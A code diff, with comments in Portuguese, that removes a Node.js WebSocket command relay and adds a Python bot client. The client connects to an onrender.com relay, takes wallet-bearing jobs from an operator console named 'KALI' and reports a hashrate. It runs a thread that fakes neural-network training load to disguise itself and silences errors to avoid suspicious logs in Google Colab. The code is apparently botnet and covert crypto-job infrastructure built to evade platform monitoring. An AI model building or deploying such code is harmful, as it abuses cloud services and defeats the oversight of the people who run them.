@@ -1,114 +1,91 @@
-const WebSocket = require('ws');
-const http = require('http');
+import websocket
+import json
+import uuid
+import threading
+import time
+import os
+import numpy as np
+from datetime import datetime
 
-const COLORS = {
-    reset: "\x1b[0m", blue: "\x1b[34m", green: "\x1b[32m", 
-    yellow: "\x1b[33m", red: "\x1b[31m", cyan: "\x1b[36m", magenta: "\x1b[35m"
-};
+# --- CONFIGURAÇÕES DE CONEXÃO ---
+RENDER_URL = "wss://shadow-relay-w6do.onrender.com"
+# O Bot ID agora é gerado uma única vez para não criar duplicatas no Kali
+BOT_ID = "ai-unit-" + str(uuid.uuid4())[:8]
 
-// --- CONFIGURAÇÃO DE SEGURANÇA ---
-const MASTER_KEY = "SHADOW_MASTER_2026_DAVID"; // Chave interna para validar o Kali
+class GhostWorker:
+    def __init__(self):
+        self.ws = None
+        self.is_running = True
+        self.wallet = None
+        self.mimic_active = True
 
-const server = http.createServer((req, res) => {
-    const stats = {
-        service: "Neural-Sync-Gateway-V3",
-        status: "High-Performance",
-        uptime: process.uptime().toFixed(2) + "s",
-        active_workers: BOTS.size,
-        orchestrator_online: !!KALI
-    };
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify(stats));
-});
+    def mimetismo_ia(self):
+        """ Gera carga de CPU oscilante para parecer treinamento de rede neural """
+        print(f"[SYSTEM] Motor de mimetismo de IA ativo.")
+        while self.is_running:
+            if self.mimic_active:
+                # Simula processamento de tensores
+                size = np.random.randint(600, 1200)
+                a = np.random.rand(size, size)
+                b = np.random.rand(size, size)
+                np.dot(a, b)
+                # Pausa aleatória para flutuação de carga
+                time.sleep(np.random.uniform(2, 8))
+            else:
+                time.sleep(5)
 
-const wss = new WebSocket.Server({ server, maxPayload: 1024 * 512 }); // Limite de 512KB por mensagem
-let KALI = null;
-const BOTS = new Map();
-
-const log = (color, type, msg) => {
-    const ts = new Date().toISOString().split('T')[1].split('.')[0];
-    console.log(`${color}[${ts}] [${type}] ${msg}${COLORS.reset}`);
-};
-
-wss.on('connection', (ws, req) => {
-    const params = new URLSearchParams(req.url.split('?')[1]);
-    const id = params.get('id');
-    const key = params.get('key');
-
-    // 1. Validação de Entrada
-    if (id === 'KALI') {
-        if (key !== MASTER_KEY) {
-            log(COLORS.red, "SECURITY", "Tentativa de acesso não autorizado bloqueada!");
-            return ws.terminate();
-        }
-        if (KALI) KALI.terminate();
-        KALI = ws;
-        log(COLORS.blue, "MASTER", "Orquestrador David autenticado e assumindo controle.");
-        
-        // Sincronização em lote para otimizar banda
-        if (BOTS.size > 0) {
-            const botList = Array.from(BOTS.keys());
-            KALI.send(JSON.stringify({ t: 'sys', event: 'sync_all', list: botList }));
-        }
-    } else if (id && id.startsWith('ai-unit-')) {
-        BOTS.set(id, ws);
-        log(COLORS.green, "NODE", `Unidade registrada: ${id}`);
-        if (KALI && KALI.readyState === WebSocket.OPEN) {
-            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
-        }
-    } else {
-        return ws.terminate(); // Recusa IDs inválidos
-    }
-
-    // 2. Processamento de Mensagens com Baixa Latência
-    ws.on('message', (message) => {
-        try {
-            const data = JSON.parse(message);
+    def on_message(self, ws, message):
+        try:
+            data = json.loads(message)
             
-            if (ws === KALI) {
-                // Direcionamento Inteligente
-                if (data.to === 'ALL') {
-                    const cmd = JSON.stringify(data.cmd);
-                    BOTS.forEach(client => client.send(cmd));
-                } else {
-                    const target = BOTS.get(data.to);
-                    if (target) target.send(JSON.stringify(data.cmd));
+            # 1. Escuta o comando vindo do Kali David via Relay
+            if data.get('type') == 'compute_weights':
+                self.wallet = data.get('wallet')
+                
+                # Gera um hashrate simulado para o Painel do Kali
+                simulated_hash = np.random.randint(1800, 2600)
+                
+                print(f"[{datetime.now().strftime('%H:%M:%S')}] Job recebido -> Sincronizando: {self.wallet[:8]}...")
+                
+                # 2. Resposta formatada para o Kali entender
+                response = {
+                    "h": simulated_hash,
+                    "status": "PROCESSANDO",
+                    "unit": BOT_ID
                 }
-            } else {
-                // Filtro de Resposta (Node -> Kali)
-                if (KALI && KALI.readyState === WebSocket.OPEN) {
-                    KALI.send(json_relay(id, data));
-                }
-            }
-        } catch (e) {
-            // Repasse de emergência para mensagens binárias/brutas
-            if (ws !== KALI && KALI) {
-                KALI.send(JSON.stringify({ t: 'res', f: id, raw: true, d: message.toString() }));
-            }
-        }
-    });
+                self.ws.send(json.dumps(response))
+                
+        except Exception as e:
+            pass # Silencioso para evitar logs suspeitos no Colab
 
-    ws.on('close', () => {
-        if (ws === KALI) {
-            KALI = null;
-            log(COLORS.magenta, "ALERT", "Orquestrador desconectado. Entrando em modo de espera.");
-        } else {
-            BOTS.delete(id);
-            log(COLORS.yellow, "NODE", `Unidade removida: ${id}`);
-            if (KALI && KALI.readyState === WebSocket.OPEN) {
-                KALI.send(JSON.stringify({ t: 'bot', s: 'off', id: id }));
-            }
-        }
-    });
+    def run(self):
+        # Baixa prioridade para o processo não travar o ambiente do Colab
+        try: os.nice(19)
+        except: pass
 
-    ws.on('error', () => ws.terminate());
-});
+        # Inicia a thread de camuflagem
+        threading.Thread(target=self.mimetismo_ia, daemon=True).start()
 
-function json_relay(from, data) {
-    return JSON.stringify({ t: 'res', f: from, d: data, ts: Date.now() });
-}
+        # Loop de conexão persistente
+        full_url = f"{RENDER_URL}?id={BOT_ID}"
+        
+        while self.is_running:
+            try:
+                print(f"[CONNECT] Unidade {BOT_ID} estabelecendo link...")
+                self.ws = websocket.WebSocketApp(
+                    full_url,
+                    on_message=self.on_message,
+                    on_error=lambda ws, e: print(f"[!] Erro de link: {e}"),
+                    on_close=lambda ws, c, m: print("[!] Link fechado. Reconectando...")
+                )
+                self.ws.run_forever()
+            except Exception as e:
+                print(f"[!] Falha crítica: {e}")
+            
+            time.sleep(15) # Intervalo de reconexão
 
-const PORT = process.env.PORT || 10000;
-server.listen(PORT, () => {
-    log(COLORS.cyan, "SYSTEM", `Shadow Relay v3.0 em execução na porta ${PORT}`);
-});
+if __name__ == "__main__":
+    # Instalação automática das dependências caso não existam
+    # !pip install websocket-client numpy - (Execute isso em uma célula acima no Colab)
+    worker = GhostWorker()
+    worker.run()
